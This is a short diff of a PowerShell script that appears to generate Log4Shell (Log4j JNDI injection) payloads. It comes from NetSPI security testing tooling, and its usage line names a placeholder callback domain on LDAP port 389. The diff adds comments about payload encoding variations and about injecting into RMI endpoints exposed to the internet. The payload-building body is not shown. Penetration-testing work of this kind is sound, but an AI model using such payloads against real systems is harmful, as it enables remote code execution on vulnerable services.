@@ -1,5 +1,7 @@
 # Author: Scott Sutherland, NetSPI 2021
 # Create-Log4jPayload -Domain "callback.domain.com" -Port 389
+# Todo: encoding, more command viations, protocol variations?
+# Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
 function Create-Log4jPayload
 (
     [Parameter(Position = 0)][System.String]$Domain,
